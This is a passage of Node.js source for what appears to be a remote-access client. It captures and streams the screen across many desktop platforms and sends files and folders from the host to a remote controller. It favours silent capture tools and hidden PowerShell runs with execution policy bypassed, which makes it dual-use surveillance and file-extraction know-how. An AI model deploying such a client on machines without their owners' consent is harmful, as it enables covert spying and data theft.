    if (!line) {
      stopPortalHelper();
      PORTAL_HELPER.failedUntil = now() + 30;
      throw new Error('the desktop portal did not answer within 30s');
    }
    if (line.startsWith('OK ')) return line.slice(3).trim();
    PORTAL_HELPER.failedUntil = now() + 30;
    throw new Error(line.slice(4).trim() || 'portal screenshot failed');
  });
  PORTAL_CHAIN = run.then(() => {}, () => {});
  return run;
}

async function capturePortal() {
  const uri = await portalShot();
  if (!uri.startsWith('file://')) throw new Error('the portal returned no file');
  let file;
  try {
    file = fileURLToPath(uri);
  } catch {
    throw new Error('the portal returned an unusable path');
  }
  try {
    const info = fs.lstatSync(file);
    if (!info.isFile()) throw new Error('the portal returned a non-file');
    if (info.size <= 0 || info.size > MAX_CAPTURE_BYTES) {
      throw new Error('the portal produced an invalid file size');
    }
    return decodeCapture(fs.readFileSync(file));
  } finally {
    // It was a temporary copy in Pictures (or /tmp); clean it up like
    // client.py does.
    try { fs.rmSync(file, { force: true }); } catch { /* ignore */ }
  }
}

// --- cursor position (for the pointer overlay) ------------------------------
const HYPR_LAYOUT = { box: null, stamp: 0 };

async function hyprlandLayout() {
  const stamp = now();
  if (HYPR_LAYOUT.box !== null && stamp - HYPR_LAYOUT.stamp < 5.0) return HYPR_LAYOUT.box;
  const exe = which('hyprctl');
  if (!exe) return null;
  let monitors = null;
  try {
    const out = await runCapture([exe, '-j', 'monitors'], 1500);
    monitors = JSON.parse(out.toString('utf8') || '[]');
  } catch { monitors = null; }
  let box = null;
  if (Array.isArray(monitors)) {
    const lefts = [], tops = [], rights = [], bottoms = [];
    for (const monitor of monitors) {
      const x = Number(monitor && monitor.x), y = Number(monitor && monitor.y);
      const w = Number(monitor && monitor.width), h = Number(monitor && monitor.height);
      if (![x, y, w, h].every(Number.isFinite) || w <= 0 || h <= 0) continue;
      lefts.push(x); tops.push(y); rights.push(x + w); bottoms.push(y + h);
    }
    if (lefts.length) {
      const left = Math.min(...lefts), top = Math.min(...tops);
      box = [left, top, Math.max(...rights) - left, Math.max(...bottoms) - top];
    }
  }
  HYPR_LAYOUT.stamp = stamp;
  HYPR_LAYOUT.box = box;
  return box;
}

async function hyprlandPointer(size) {
  const exe = which('hyprctl');
  if (!exe) return null;
  let out;
  try { out = await runCapture([exe, 'cursorpos'], 1000); } catch { return null; }
  const match = /(-?\d+)\s*,\s*(-?\d+)/.exec(out.toString('utf8'));
  if (!match) return null;
  const x = parseInt(match[1], 10), y = parseInt(match[2], 10);
  const [width, height] = size;
  const box = await hyprlandLayout();
  if (box === null) {
    if (x >= 0 && x < width && y >= 0 && y < height) return [x, y];
    return null;
  }
  const [left, top, spanX, spanY] = box;
  if (spanX <= 0 || spanY <= 0) return null;
  const px = (x - left) * width / spanX;
  const py = (y - top) * height / spanY;
  if (px >= 0 && px < width && py >= 0 && py < height) return [px, py];
  return null;
}

const X11_GEOMETRY = { size: null, stamp: 0 };

async function x11RootSize(exe) {
  const stamp = now();
  if (X11_GEOMETRY.size !== null && stamp - X11_GEOMETRY.stamp < 5.0) return X11_GEOMETRY.size;
  let size = null;
  try {
    const out = (await runCapture([exe, 'getdisplaygeometry'], 1500)).toString('utf8').trim();
    const match = /^(\d+)\s+(\d+)/.exec(out);
    if (match) size = [parseInt(match[1], 10), parseInt(match[2], 10)];
  } catch { size = null; }
  X11_GEOMETRY.size = size;
  X11_GEOMETRY.stamp = stamp;
  return size;
}

// X11 pointer through xdotool (libX11 through ctypes is not available to
// Node).  Same mapping as _x11_pointer: root coordinates scaled to the image.
async function x11Pointer(size) {
  const exe = which('xdotool');
  if (!exe) return null;
  let out;
  try {
    out = (await runCapture([exe, 'getmouselocation', '--shell'], 1500)).toString('utf8');
  } catch { return null; }
  const match = /X=(-?\d+)\s+Y=(-?\d+)/.exec(out);
  if (!match) return null;
  const span = await x11RootSize(exe);
  if (!span || span[0] <= 0 || span[1] <= 0) return null;
  const [width, height] = size;
  const px = parseInt(match[1], 10) * width / span[0];
  const py = parseInt(match[2], 10) * height / span[1];
  if (px >= 0 && px < width && py >= 0 && py < height) return [px, py];
  return null;
}

const PS_CURSOR_SCRIPT = [
  'Add-Type -AssemblyName System.Windows.Forms',
  '$p = [System.Windows.Forms.Cursor]::Position',
  '$b = [System.Windows.Forms.SystemInformation]::VirtualScreen',
  'Write-Output ("{0} {1} {2} {3} {4} {5}" -f $p.X, $p.Y, $b.Left, $b.Top, $b.Width, $b.Height)',
].join('; ');

// One PowerShell per client that answers cursor queries: spawning it per
// frame would cost ~200 ms, which is exactly why client.py keeps a helper
// process with a line protocol.
const PS_CURSOR = { child: null, buffer: '', waiters: [], failedUntil: 0 };

function stopPsCursorHelper() {
  const child = PS_CURSOR.child;
  PS_CURSOR.child = null;
  PS_CURSOR.buffer = '';
  for (const waiter of PS_CURSOR.waiters.splice(0)) waiter(null);
  if (!child) return;
  try { child.stdin.end(); } catch { /* ignore */ }
  const killer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* ignore */ } }, 1000);
  if (killer.unref) killer.unref();
}

function startPsCursorHelper() {
  const child = spawnChild(powershellPath(), ['-NoProfile', '-NonInteractive',
    '-ExecutionPolicy', 'Bypass', '-Command', PS_CURSOR_SCRIPT],
    { stdio: ['pipe', 'pipe', 'pipe'], windowsHide: true });
  PS_CURSOR.child = child;
  PS_CURSOR.buffer = '';
  PS_CURSOR.waiters = [];
  child.stdout.on('data', (data) => {
    PS_CURSOR.buffer += data.toString('utf8');
    let index;
    while ((index = PS_CURSOR.buffer.indexOf('\n')) >= 0) {
      const line = PS_CURSOR.buffer.slice(0, index).trim();
      PS_CURSOR.buffer = PS_CURSOR.buffer.slice(index + 1);
      const waiter = PS_CURSOR.waiters.shift();
      if (waiter) waiter(line);
    }
  });
  child.on('error', () => { if (PS_CURSOR.child === child) PS_CURSOR.child = null; });
  child.on('close', () => {
    if (PS_CURSOR.child === child) PS_CURSOR.child = null;
    for (const waiter of PS_CURSOR.waiters.splice(0)) waiter(null);
  });
  return child;
}

function psCursorQuery() {
  return new Promise((resolve) => {
    let child = PS_CURSOR.child;
    if (!child || child.exitCode !== null) {
      if (now() < PS_CURSOR.failedUntil) { resolve(null); return; }
      try {
        child = startPsCursorHelper();
      } catch {
        PS_CURSOR.failedUntil = now() + 60;
        resolve(null);
        return;
      }
      const warmup = setTimeout(() => {
        if (PS_CURSOR.child === child) { stopPsCursorHelper(); PS_CURSOR.failedUntil = now() + 60; }
      }, 4000);
      if (warmup.unref) warmup.unref();
    }
    let settled = false;
    const waiter = (line) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      resolve(line);
    };
    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      const index = PS_CURSOR.waiters.indexOf(waiter);
      if (index >= 0) PS_CURSOR.waiters.splice(index, 1);
      resolve(null);
    }, 1500);
    if (timer.unref) timer.unref();
    PS_CURSOR.waiters.push(waiter);
    try { child.stdin.write('\n'); } catch { /* the close handler answers */ }
  });
}

async function windowsPointer(size) {
  const line = await psCursorQuery();
  if (!line) return null;
  const parts = line.split(/\s+/).map(Number);
  if (parts.length < 6 || !parts.every(Number.isFinite)) return null;
  const [x, y, left, top, spanX, spanY] = parts;
  if (spanX <= 0 || spanY <= 0) return null;
  const [width, height] = size;
  const px = (x - left) * width / spanX;
  const py = (y - top) * height / spanY;
  if (px >= 0 && px < width && py >= 0 && py < height) return [px, py];
  return null;
}

async function cursorHotspot(size) {
  const [width, height] = size;
  if (width <= 0 || height <= 0) return null;
  try {
    if (IS_WINDOWS) return await windowsPointer(size);
    if (IS_DARWIN) return null;      // screencapture -C already painted it
    if (IS_LINUX) {
      if (process.env.WAYLAND_DISPLAY) return await hyprlandPointer(size);
      return await x11Pointer(size);
    }
  } catch { /* a missing pointer must never break a capture */ }
  return null;
}

// Draw the arrow (white fill, black border) so screen shares show motion even
// on a VMware guest, where the guest pointer cannot be captured at all.
function paintPointer(image, position) {
  const { width, height, data } = image;
  let [x, y] = position;
  const scale = Math.max(0.7, Math.min(width / 1366.0, 1.6));
  x = Math.min(Math.max(0, Math.round(x)), Math.max(0, width - 2));
  y = Math.min(Math.max(0, Math.round(y)), Math.max(0, height - 2));
  const points = [
    [x, y],
    [x + Math.round(17 * scale), y + Math.round(15 * scale)],
    [x + Math.round(9 * scale), y + Math.round(16 * scale)],
    [x + Math.round(13 * scale), y + Math.round(25 * scale)],
    [x + Math.round(8 * scale), y + Math.round(27 * scale)],
    [x + Math.round(4 * scale), y + Math.round(18 * scale)],
    [x, y + Math.round(23 * scale)],
  ];
  const blend = (px, py, color, alpha) => {
    if (px < 0 || py < 0 || px >= width || py >= height) return;
    const offset = (py * width + px) * 3;
    data[offset] = Math.round(data[offset] * (1 - alpha) + color[0] * alpha);
    data[offset + 1] = Math.round(data[offset + 1] * (1 - alpha) + color[1] * alpha);
    data[offset + 2] = Math.round(data[offset + 2] * (1 - alpha) + color[2] * alpha);
  };
  // Even-odd scanline fill.
  let minY = Infinity, maxY = -Infinity;
  for (const [, py] of points) { minY = Math.min(minY, py); maxY = Math.max(maxY, py); }
  for (let py = Math.max(0, minY); py <= Math.min(height - 1, maxY); py++) {
    const crossings = [];
    for (let i = 0; i < points.length; i++) {
      const [x1, y1] = points[i];
      const [x2, y2] = points[(i + 1) % points.length];
      if ((y1 <= py && y2 > py) || (y2 <= py && y1 > py)) {
        crossings.push(x1 + (py - y1) * (x2 - x1) / (y2 - y1));
      }
    }
    crossings.sort((a, b) => a - b);
    for (let i = 0; i + 1 < crossings.length; i += 2) {
      const from = Math.max(0, Math.ceil(crossings[i]));
      const to = Math.min(width - 1, Math.floor(crossings[i + 1]));
      for (let px = from; px <= to; px++) blend(px, py, [255, 255, 255], 245 / 255);
    }
  }
  // Black outline on top (PIL's outline= + width=2), drawn as thick lines.
  const thickness = 2;
  for (let i = 0; i < points.length; i++) {
    const [x1, y1] = points[i];
    const [x2, y2] = points[(i + 1) % points.length];
    const steps = Math.max(Math.abs(x2 - x1), Math.abs(y2 - y1));
    for (let step = 0; step <= steps; step++) {
      const px = Math.round(x1 + (x2 - x1) * (steps ? step / steps : 0));
      const py = Math.round(y1 + (y2 - y1) * (steps ? step / steps : 0));
      for (let dx = 0; dx < thickness; dx++) {
        for (let dy = 0; dy < thickness; dy++) blend(px + dx, py + dy, [0, 0, 0], 1);
      }
    }
  }
}

async function drawCursorOverlay(image, position = null) {
  if (CAPTURE_STATE.hasCursor) return image;
  try {
    let spot = position;
    if (spot === null || spot === undefined) spot = await cursorHotspot([image.width, image.height]);
    if (!spot) return image;
    paintPointer(image, spot);
  } catch { /* overlay is cosmetic */ }
  return image;
}

// --- backend table and selection -------------------------------------------
async function captureBackend(name, fast = false) {
  CAPTURE_STATE.hasCursor = false;
  if (name === 'android') return captureAndroid();
  if (name === 'screencapture') {
    const img = await captureScreencapture(fast);
    CAPTURE_STATE.hasCursor = true;      // -C painted the pointer
    return img;
  }
  if (name === 'grim') {
    const exe = which('grim');
    if (!exe) throw new Error('not installed (not found in PATH)');
    // Streaming asks for uncompressed PPM.  grim's JPEG encoder is fast, but
    // decoding a full-resolution JPEG in JS costs far more than the capture;
    // PPM is already in fitRgb()'s byte layout, so only the scaled output is
    // JPEG-encoded.  One-shot screenshots keep the smaller JPEG transfer.
    if (fast) {
      return decodePpm(await captureStdout([exe, '-c', '-t', 'ppm', '-']));
    }
    // -t jpeg: grim's JPEG encoder is ~6x faster than its PNG encoder and the
    // built-in decoder handles it directly (same choice as client.py).
    // -c asks wlroots for the pointer, but Hyprland's screencopy ignores it,
    // so the overlay is used instead (CAPTURE_STATE.hasCursor stays false).
    return decodeCapture(await captureStdout([exe, '-c', '-t', 'jpeg', '-']));
  }
  if (name === 'spectacle') {
    const exe = which('spectacle');
    if (!exe) throw new Error('not installed (not found in PATH)');
    const img = decodeCapture(await captureFile([exe, '-b', '-n', '-f', '-p', '-o']));
    CAPTURE_STATE.hasCursor = true;      // -p painted the pointer
    return img;
  }
  if (name === 'gnome_shell') {
    const img = await captureGnomeShell();
    CAPTURE_STATE.hasCursor = true;
    return img;
  }
  if (name === 'portal') return capturePortal();
  if (name === 'powershell') return captureWindows(fast);
  if (name === 'magick') {
    const cmd = imageMagickCommand();
    if (!cmd) throw new Error('not installed (not found in PATH)');
    return decodeCapture(await captureStdout(cmd));
  }
  if (name === 'scrot') {
    if (!which('scrot')) throw new Error('not installed (not found in PATH)');
    return decodeCapture(await captureFile(['scrot', '-o']));
  }
  if (name === 'maim') {
    if (!which('maim')) throw new Error('not installed (not found in PATH)');
    return decodeCapture(await captureFile(['maim']));
  }
  throw new Error('unknown capture backend ' + name);
}

function captureOrder(wayland, desktop) {
  if (isAndroid()) return ['android'];                 // root screencap or a clear error
  if (isIOS()) return ['screencapture'];               // only a jailbreak has a tool
  if (isMacOS()) return ['screencapture', 'powershell'];  // (the second never exists)
  if (IS_WINDOWS) return ['powershell'];
  if (wayland) {
    // Only the desktop's own helpers can see a Wayland screen; X11 tools
    // would silently capture XWayland's blank root window instead.
    if (desktop.includes('kde') || desktop.includes('plasma')) {
      return ['spectacle', 'grim', 'portal', 'gnome_shell'];
    }
    if (desktop.includes('gnome')) return ['portal', 'gnome_shell', 'grim', 'spectacle'];
    return ['grim', 'spectacle', 'portal', 'gnome_shell'];
  }
  if (IS_LINUX) return ['magick', 'scrot', 'maim'];    // X11, all silent
  return ['powershell'];
}

async function grabScreen(fast = false) {
  const wayland = IS_LINUX && !!process.env.WAYLAND_DISPLAY;
  const desktop = (process.env.XDG_CURRENT_DESKTOP || '').toLowerCase();
  const order = [...new Set(captureOrder(wayland, desktop))];
  const errors = [];
  for (const name of order) {
    try {
      const img = await captureBackend(name, fast);
      if (wayland && X11_CAPTURE_TOOLS.has(name)) {
        // A flat picture on a Wayland session is XWayland's blank root.
        let min = 255, max = 0;
        const data = img.data;
        for (let i = 0; i + 2 < data.length && min !== max; i += 3) {
          const lum = (data[i] * 299 + data[i + 1] * 587 + data[i + 2] * 114) / 1000;
          if (lum < min) min = lum;
          if (lum > max) max = lum;
        }
        if (min === max) throw new Error('empty XWayland picture (solid colour)');
      }
      return img;
    } catch (e) {
      const detail = (e && e.code === 'ENOENT')
        ? 'not installed (not found in PATH)' : errorText(e);
      errors.push(name + ': ' + detail);
    }
  }
  if (isAndroid()) {
    throw new CaptureError('no screen capture available (' + errors.join(' | ') + '). Android: '
      + 'screen capture needs root (su + /system/bin/screencap); stock Android blocks it.', errors);
  }
  if (isIOS()) {
    throw new CaptureError('no screen capture available (' + errors.join(' | ') + '). iOS: stock iOS '
      + 'does not allow screen capture. Only a jailbroken device with a screencapture tool can do it.', errors);
  }
  if (isMacOS()) {
    throw new CaptureError('no screen capture available (' + errors.join(' | ') + '). macOS: grant '
      + 'Screen & System Audio Recording permission to your terminal in System Settings > Privacy & '
      + 'Security, then restart it.', errors);
  }
  if (!guiSessionAvailable()) {
    throw new CaptureError('no screen capture available (' + errors.join(' | ') + '). Headless Linux '
      + 'session (no DISPLAY / WAYLAND_DISPLAY): commands, transfers and the interactive shell work; '
      + 'screenshots and screen sharing need a real desktop session.', errors);
  }
  if (wayland) {
    throw new CaptureError('no screen capture available (' + errors.join(' | ') + '). Wayland: install '
      + 'the desktop helper (grim on Hyprland/Sway, kde-spectacle on KDE) or enable the XDG desktop '
      + 'portal (python3-gi / python3-gobject). X11 tools only see XWayland and cannot capture the '
      + 'real screen.', errors);
  }
  if (IS_LINUX) {
    throw new CaptureError('no screen capture available (' + errors.join(' | ') + '). Linux X11: '
      + 'install ImageMagick (import), scrot or maim; all three are silent.', errors);
  }
  throw new CaptureError('no screen capture available (' + errors.join(' | ') + '). Windows: screen '
    + 'capture needs PowerShell, which ships with Windows; see the attempt details above.', errors);
}

async function takeScreenshot(conn, reqId = null) {
  let jpeg;
  try {
    let img = await grabScreen(false);
    img = await drawCursorOverlay(img);
    jpeg = encodeJpeg(img, SCREENSHOT_JPEG_QUALITY);
  } catch (e) {
    try {
      await sendMsg(conn, {
        type: 'error', id: reqId,
        data: 'screenshot failed: ' + errorText(e),
        diag: captureDiag(e),
      });
    } catch { /* the socket is gone; the main loop reconnects */ }
    return;
  }
  await sendMsg(conn, {
    type: 'image', id: reqId, name: 'screenshot.jpg',
    data: jpeg.toString('base64'),
  });
}

// A frame is a length-prefixed payload whose first byte is 0x01, so the
// controller can tell it apart from a JSON reply on the same socket.
async function sendFrame(conn, jpeg) {
  const payload = Buffer.allocUnsafe(1 + jpeg.length);
  payload[0] = 0x01;
  jpeg.copy(payload, 1);
  const frame = Buffer.allocUnsafe(4 + payload.length);
  frame.writeUInt32BE(payload.length, 0);
  payload.copy(frame, 4);
  await conn.write(frame);
}

async function streamScreen(conn, fps, stopToken, reqId = null) {
  let interval = null;
  if (fps) {
    const value = parseFloat(fps);            // "2.5" is valid, not just "2"
    if (Number.isFinite(value)) interval = 1.0 / Math.max(1.0, Math.min(value, 60.0));
  }
  let failed = false;
  let lastSize = null;
  // Start at the normal size/quality, step down only when the send itself is
  // slow, and recover gradually on a fast link (mirrors stream_screen).
  const sizes = [SCREEN_SIZE, [854, 480], [768, 432], [640, 360]];
  let sizeIndex = 0;
  let quality = SCREEN_JPEG_QUALITY;
  let slowFrames = 0;
  let fastFrames = 0;
  const targetInterval = interval || 1.0 / 12.0;
  const slowThreshold = Math.max(0.12, targetInterval * 0.8);
  while (!stopToken.stopped) {
    const frameStart = now();
    let jpeg;
    try {
      // Sample the pointer before a slow grab so the arrow belongs to this
      // frame rather than jumping ahead while the capture runs.
      let pointer = null;
      if (lastSize !== null && !CAPTURE_STATE.hasCursor) pointer = await cursorHotspot(lastSize);
      let img = await grabScreen(true);
      img = fitRgb(img, sizes[sizeIndex][0], sizes[sizeIndex][1]);
      if (pointer && lastSize) {
        pointer = [pointer[0] * img.width / lastSize[0],
          pointer[1] * img.height / lastSize[1]];
      }
      img = await drawCursorOverlay(img, pointer);
      lastSize = [img.width, img.height];
      jpeg = encodeJpeg(img, quality);
    } catch (e) {
      try {
        await sendMsg(conn, {
          type: 'error', id: reqId,
          data: 'screenshot failed: ' + errorText(e),
          diag: captureDiag(e),
        });
      } catch { /* the main loop reconnects */ }
      failed = true;
      break;
    }

    const sendStart = now();
    await sendFrame(conn, jpeg);              // a broken socket -> reconnect
    const sendElapsed = now() - sendStart;
    if (sendElapsed > slowThreshold) {
      fastFrames = 0;
      slowFrames += 1;
      if (slowFrames >= 2) {
        slowFrames = 0;
        if (quality > 50) quality = Math.max(50, quality - 6);
        else if (sizeIndex + 1 < sizes.length) sizeIndex += 1;
      }
    } else if (sendElapsed < Math.min(0.08, slowThreshold * 0.55)) {
      slowFrames = 0;
      fastFrames += 1;
      if (fastFrames >= 12) {
        fastFrames = 0;
        if (quality < SCREEN_JPEG_QUALITY) quality = Math.min(SCREEN_JPEG_QUALITY, quality + 3);
        else if (sizeIndex > 0) sizeIndex -= 1;
      }
    }

    if (interval) {
      const elapsed = now() - frameStart;
      if (elapsed < interval) await sleep((interval - elapsed) * 1000);
    }
  }

  if (!failed) {
    await sendMsg(conn, { type: 'output', id: reqId, data: '[client] screen share stopped' });
  }
}

const STREAM = { task: null, stop: null, id: null };

function streamRunning() {
  return STREAM.task !== null;
}

function startStreamWorker(conn, fps, reqId) {
  const stopToken = { stopped: false };
  const task = (async () => {
    try {
      await streamScreen(conn, fps, stopToken, reqId);
    } catch (e) {
      log('[!] screen share stopped: ' + errorText(e));
      // A frame/JSON write can fail after a partial payload.  The control
      // socket is out of sync now; close it so the main loop reconnects
      // instead of reading a "header" from the next reply.
      try { conn.close(); } catch { /* ignore */ }
    } finally {
      if (STREAM.task === task) {
        STREAM.task = null;
        STREAM.stop = null;
        STREAM.id = null;
      }
    }
  })();
  STREAM.task = task;
  STREAM.stop = stopToken;
  STREAM.id = reqId;
  task.catch(() => {});
  return true;
}

// Ask a running screen share to finish (it sends the closing message).
// Returns false when nothing was streaming.
async function stopStream(wait = 1.5) {
  const stopToken = STREAM.stop;
  const task = STREAM.task;
  if (!stopToken) return false;
  stopToken.stopped = true;
  if (task && wait > 0) {
    try { await Promise.race([task, sleep(wait * 1000)]); } catch { /* ignore */ }
  }
  return true;
}

// ---------------------------------------------------------------------------
// File and folder transfers (mirrors _scan_transfer_tree / _IncomingTransfer)
//
// Uploads and downloads use the streamed transfer protocol so no file size is
// capped and neither side ever holds a whole file in memory.  Paths from the
// controller are sanitized and can never escape the destination directory;
// each file is written to a temporary name and only renamed into place after
// size and SHA-256 both match.
// ---------------------------------------------------------------------------
const WINDOWS_RESERVED_NAMES = new Set(['CON', 'PRN', 'AUX', 'NUL',
  ...Array.from({ length: 9 }, (_, i) => 'COM' + (i + 1)),
  ...Array.from({ length: 9 }, (_, i) => 'LPT' + (i + 1))]);

function safeTransferRel(value) {
  if (typeof value !== 'string') return null;
  value = value.replace(/\\/g, '/').replace(/\x00/g, '');
  if (value.startsWith('/')) value = value.replace(/^\/+/, '');
  const parts = [];
  for (let part of value.split('/')) {
    if (part === '' || part === '.') continue;
    if (part === '..') return null;
    let cleaned = '';
    for (const char of part) {
      const code = char.codePointAt(0);
      if ('<>:"|?*'.includes(char) || code < 32 || code === 0x7f) cleaned += '_';
      else cleaned += char;
    }
    part = cleaned.replace(/[ .]+$/, '');
    if (!part) continue;
    if (WINDOWS_RESERVED_NAMES.has(part.split('.')[0].toUpperCase())) part = '_' + part;
    if (part.length > 240) return null;
    parts.push(part);
  }
  if (!parts.length) return null;
  const result = parts.join('/');
  return result.length <= 3000 ? result : null;
}

function lstatOrNull(target) {
  try { return fs.lstatSync(target); } catch { return null; }
}

// Join a sanitized relative path under a base directory, creating missing
// folders, and refuse to traverse an existing symlink.
function safeJoinUnder(base, rel) {
  let current = base;
  const parts = rel.split('/');
  for (let index = 0; index < parts.length; index++) {
    current = path.join(current, parts[index]);
    const info = lstatOrNull(current);
    if (info && info.isSymbolicLink()) {
      throw new Error('refusing to write through symlink: ' + current);
    }
    const last = index === parts.length - 1;
    if (!last) {
      if (info) {
        if (!info.isDirectory()) throw new Error('not a directory: ' + current);
      } else {
        fs.mkdirSync(current);
      }
    }
  }
  return current;
}

// Build the manifest for a file or folder this client will upload.  Returns
// null when the transfer is cancelled while walking a large tree.
function scanTransferTree(targetPath, topName = null, cancel = null) {
  const stopped = () => cancel !== null && cancel !== undefined && cancel.stopped;
  if (stopped()) return null;
  const expanded = expandUser(targetPath);
  const source = path.resolve(expanded);
  const warnings = [];
  const rootInfo = lstatOrNull(source);
  if (!rootInfo) throw new Error('cannot read ' + targetPath + ': no such file or directory');
  if (rootInfo.isSymbolicLink()) {
    throw new Error('symbolic links are not sent; use the real folder');
  }
  if (rootInfo.isFile()) {
    const root = safeTransferRel(topName || path.basename(source));
    if (!root) throw new Error('the file name is not safe to send');
    return {
      source, kind: 'file', root, entries: [],
      files: [[root, source, rootInfo.size, rootInfo.mode & 0o777]],
      totalFiles: 1, totalBytes: rootInfo.size, warnings,
    };
  }
  if (!rootInfo.isDirectory()) throw new Error('not a regular file or folder');
  const root = safeTransferRel(topName
    || path.basename(source.replace(/[\\/]+$/, ''))) || 'upload';
  const entries = [];
  const files = [];
  const seen = new Set();
  let totalFiles = 0;
  let totalBytes = 0;
  // Depth-first like os.walk; children are pushed in reverse so every
  // directory is visited in sorted order.
  const stack = [source];
  while (stack.length) {
    if (stopped()) return null;
    const base = stack.pop();
    const relBase = path.relative(source, base);
    const relParent = relBase === '' ? null : safeTransferRel(relBase);
    if (relBase !== '' && !relParent) {
      // The parent was already skipped; do not send its descendants.
      warnings.push('skipped unsafe folder ' + relBase);
      continue;
    }
    let dirents;
    try {
      dirents = fs.readdirSync(base, { withFileTypes: true });
    } catch (e) {
      warnings.push('skipped ' + base + ': ' + errorText(e));
      continue;
    }
    const dirNames = [];
    const fileNames = [];
    for (const dirent of dirents) {
      if (dirent.isDirectory()) dirNames.push(dirent.name);
      else fileNames.push(dirent.name);
    }
    dirNames.sort();
    fileNames.sort();
    const kept = [];
    for (const name of dirNames) {
      const full = path.join(base, name);
      if (lstatOrNull(full) && lstatOrNull(full).isSymbolicLink()) {
        warnings.push('skipped symlink ' + full);
        continue;
      }
      const rel = safeTransferRel(relParent === null ? name : relParent + '/' + name);
      if (!rel) {
        warnings.push('skipped unsafe folder ' + full);
        continue;
      }
      if (seen.has(rel)) {
        warnings.push('skipped colliding folder ' + full);
        continue;
      }
      seen.add(rel);
      entries.push({ path: rel, kind: 'dir' });
      kept.push(name);
    }
    for (let index = kept.length - 1; index >= 0; index--) {
      stack.push(path.join(base, kept[index]));
    }
    for (const name of fileNames) {
      if (stopped()) return null;
      const full = path.join(base, name);
      const info = lstatOrNull(full);
      if (!info) {
        warnings.push('skipped ' + full + ': no longer readable');
        continue;
      }
      if (info.isSymbolicLink()) {
        warnings.push('skipped symlink ' + full);
        continue;
      }
      if (!info.isFile()) {
        warnings.push('skipped special file ' + full);
        continue;
      }
      const rel = safeTransferRel(relParent === null ? name : relParent + '/' + name);
      if (!rel) {
        warnings.push('skipped unsafe name ' + full);
        continue;
      }
      if (seen.has(rel)) {
        warnings.push('skipped colliding file ' + full);
        continue;
      }
      seen.add(rel);
      const mode = info.mode & 0o777;
      entries.push({ path: rel, kind: 'file', size: info.size, mode });
      files.push([rel, full, info.size, mode]);
      totalFiles += 1;
      totalBytes += info.size;
    }
  }
  if (stopped()) return null;
  return { source, kind: 'dir', root, entries, files, totalFiles, totalBytes, warnings };
}

function outgoingKey(reqId) {
  return reqId != null && validReqId(reqId) ? reqId : null;
}

function outgoingCancel(reqId) {
  const key = outgoingKey(reqId);
  if (key === null) return false;
  const token = OUTGOING_TRANSFERS.get(key);
  if (!token) return false;
  token.stopped = true;
  return true;
}

function abortOutgoingTransfers() {
  const tokens = [...OUTGOING_TRANSFERS.values()];
  OUTGOING_TRANSFERS.clear();
  for (const token of tokens) token.stopped = true;
}

function abortIncomingTransfers() {
  const states = [...INCOMING_TRANSFERS.values()];
  INCOMING_TRANSFERS.clear();
  for (const state of states) state.discardFile();
}

function entryBatches(entries) {
  const batches = [];
  let batch = [];
  let size = 0;
  for (const entry of entries) {
    const itemSize = (typeof entry.path === 'string' ? entry.path.length : 0) + 96;
    if (batch.length && (batch.length >= TRANSFER_ENTRY_BATCH
        || size + itemSize > TRANSFER_ENTRY_BYTES)) {
      batches.push(batch);
      batch = [];
      size = 0;
    }
    batch.push(entry);
    size += itemSize;
  }
  if (batch.length) batches.push(batch);
  return batches;
}

// Stream any file or folder to the controller: every file uses this path, so
// file size is not capped.  Runs as a background task, so the read loop stays
// free to receive a cancellation (stop / Ctrl+Z).
async function downloadTransfer(conn, reqId, realPath, cancel = null) {
  const canceled = () => cancel !== null && cancel !== undefined && cancel.stopped;
  const stopEarly = async () => {
    try {
      await sendMsg(conn, { type: 'transfer_abort', id: reqId, reason: 'canceled by the controller' });
      await sendMsg(conn, { type: 'transfer_end', id: reqId });
    } catch { /* the link is already gone */ }
  };

  if (canceled()) {
    await stopEarly();
    return;
  }
  let plan;
  try {
    plan = scanTransferTree(realPath, null, cancel);
  } catch (e) {
    await sendMsg(conn, { type: 'error', id: reqId, data: 'download failed: ' + errorText(e) });
    return;
  }
  if (plan === null || canceled()) {
    await stopEarly();
    return;
  }
  const entries = plan.entries || [];
  // Large manifests are streamed in batches, so the begin message stays small
  // however many files (or however long the paths) there are.
  const streamEntries = entries.length > 0;
  await sendMsg(conn, {
    type: 'transfer_begin', id: reqId, direction: 'download', kind: plan.kind,
    root: plan.root, entries: streamEntries ? [] : entries,
    entries_streamed: streamEntries,
    total_files: plan.totalFiles, total_bytes: plan.totalBytes,
  });
  let received = 0;
  if (streamEntries) {
    for (const batch of entryBatches(entries)) {
      if (canceled()) {
        await stopEarly();
        return;
      }
      await sendMsg(conn, { type: 'transfer_entries', id: reqId, entries: batch });
    }
  }
  for (const [rel, source, size, mode] of plan.files) {
    if (canceled()) {
      await stopEarly();
      return;
    }
    await sendMsg(conn, { type: 'transfer_file_begin', id: reqId, path: rel, size, mode });
    const digest = crypto.createHash('sha256');
    let sent = 0;
    let handle = null;
    try {
      handle = await fs.promises.open(source, 'r');
      const buffer = Buffer.allocUnsafe(TRANSFER_CHUNK);
      for (;;) {
        if (canceled()) {
          await handle.close().catch(() => {});
          handle = null;
          await stopEarly();
          return;
        }
        const { bytesRead } = await handle.read(buffer, 0, buffer.length, null);
        if (!bytesRead) break;
        const chunk = buffer.subarray(0, bytesRead);
        digest.update(chunk);
        sent += bytesRead;
        await sendMsg(conn, { type: 'transfer_chunk', id: reqId, data: chunk.toString('base64') });
        if (sent && sent % (8 * 1024 * 1024) < TRANSFER_CHUNK) {
          await sendMsg(conn, {
            type: 'transfer_progress', id: reqId,
            received: received + sent, total: plan.totalBytes,
          });
        }
      }
    } catch (e) {
      if (handle) { await handle.close().catch(() => {}); handle = null; }
      try {
        await sendMsg(conn, {
          type: 'transfer_abort', id: reqId,
          reason: 'could not read ' + source + ': ' + errorText(e),
        });
        await sendMsg(conn, { type: 'transfer_end', id: reqId });
      } catch { /* the link is gone */ }
      return;
    } finally {
      if (handle) await handle.close().catch(() => {});
    }
    await sendMsg(conn, {
      type: 'transfer_file_end', id: reqId, path: rel, size: sent,
      hash: digest.digest('hex'),
    });
    received += sent;
  }
  await sendMsg(conn, { type: 'transfer_end', id: reqId });
}

function startDownloadTransfer(conn, reqId, realPath) {
  const key = outgoingKey(reqId);
  const cancel = { stopped: false };
  if (key !== null) {
    const old = OUTGOING_TRANSFERS.get(key);
    if (old) old.stopped = true;
    OUTGOING_TRANSFERS.set(key, cancel);
  }
  const task = (async () => {
    try {
      await downloadTransfer(conn, reqId, realPath, cancel);
    } catch {
      // A send failure has desynchronized or closed this link; the main loop
